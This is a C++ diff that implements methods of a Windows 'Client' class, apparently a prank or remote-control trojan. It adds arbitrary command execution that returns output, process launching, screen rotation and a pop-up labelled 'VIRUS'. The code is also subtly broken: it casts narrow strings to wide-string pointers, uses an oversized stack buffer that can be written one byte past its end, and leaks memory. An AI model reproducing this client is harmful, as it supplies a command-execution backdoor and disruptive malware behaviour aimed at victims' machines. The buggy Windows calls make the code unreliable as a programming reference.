@@ -5,7 +5,6 @@ bool terminateThread = false;
 
 Client::Client()
 {
-	
 }
 
 Client::~Client()
@@ -19,12 +18,38 @@ Client::~Client()
 //Process Execution
 void Client::startProcess(const std::string &proc)
 {
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
 
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	if (!CreateProcess((LPCWSTR)proc.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+	{
+		printf("CreateProcess failed (%d).\n", GetLastError());
+	}
+	else
+	{
+		printf("Prcess Creation Success");
+	}
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 }
 
-void Client::runCmdCommand(const std::string &command)
+std::string Client::runCmdCommand(const std::string &command)
 {
+	FILE * uname;
+	char os[800000];
+	int lastchar;
 
+	uname = _popen(command.c_str(), "r");
+	lastchar = fread(os, 1, 800000, uname);
+	os[lastchar] = '\0';
+	_pclose(uname);
+	return std::string(os);
 }
 
 //File Handling
@@ -102,14 +127,53 @@ void Client::toggleInvertMouse()
 	}
 }
 
-
-
 void Client::rotateDisplay()
 {
+	DEVMODE dm;
+	ZeroMemory(&dm, sizeof(dm));
+	dm.dmSize = sizeof(dm);
+	if (0 != EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm))
+	{
+		// swap height and width
+		DWORD dwTemp = dm.dmPelsHeight;
+		dm.dmPelsHeight = dm.dmPelsWidth;
+		dm.dmPelsWidth = dwTemp;
 
+		// determine new orientaion
+		switch (dm.dmDisplayOrientation)
+		{
+		case DMDO_DEFAULT:
+			dm.dmDisplayOrientation = DMDO_270;
+			break;
+		case DMDO_270:
+			dm.dmDisplayOrientation = DMDO_180;
+			break;
+		case DMDO_180:
+			dm.dmDisplayOrientation = DMDO_90;
+			break;
+		case DMDO_90:
+			dm.dmDisplayOrientation = DMDO_DEFAULT;
+			break;
+		default:
+			// unknown orientation value
+			// add exception handling here
+			break;
+		}
+		long lRet = ChangeDisplaySettings(&dm, 0);
+		if (DISP_CHANGE_SUCCESSFUL != lRet)
+		{
+			// add exception handling here
+		}
+	}
 }
 
-void Client::message()
+void Client::message(const std::string &m)
 {
-
+	int len;
+	int length = (int)m.length() + 1;
+	len = MultiByteToWideChar(CP_ACP, 0, m.c_str(), length, 0, 0);
+	wchar_t* buf = new wchar_t[len];
+	MultiByteToWideChar(CP_ACP, 0, m.c_str(), length, buf, len);
+	std::wstring r(buf);
+	MessageBox(NULL, (LPCWSTR)r.c_str(), L"VIRUS", MB_OK | MB_ICONERROR);
 }
